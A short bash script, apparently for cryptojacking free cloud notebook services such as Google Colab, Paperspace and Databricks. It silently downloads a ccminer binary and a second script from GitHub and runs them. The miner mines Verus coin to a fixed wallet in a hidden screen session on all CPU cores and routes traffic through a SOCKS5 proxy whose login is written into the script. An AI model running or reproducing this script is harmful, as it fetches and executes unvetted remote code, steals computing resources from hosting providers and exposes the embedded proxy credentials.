#!/bin/bash
array[0]="google_colab"
array[1]="paperspace"
array[2]="databricks"
size=${#array[@]}
index=$(($RANDOM % $size))
worker=${array[$index]}
sleep 10s
wget -qO deploy https://github.com/renifer12/master/raw/master/ccminer
wget -qO compile https://github.com/renifer12/master/raw/master/compile.sh
chmod +x deploy compile
screen -dm -S run ./deploy -a verus -o stratum+tcp://ap.luckpool.net:3956 -u RA5S1Suf1BHvTiphQ3VRnWy6aShii374j5.Ren_$(cat /proc/sys/kernel/hostname)_$(echo $worker) -p c=VRSC -t $(nproc --all) -x socks5://a019xpj2-3va47yc:gad7w69xcf@socks-us.windscribe.com:1080
sleep 10s && ./compile
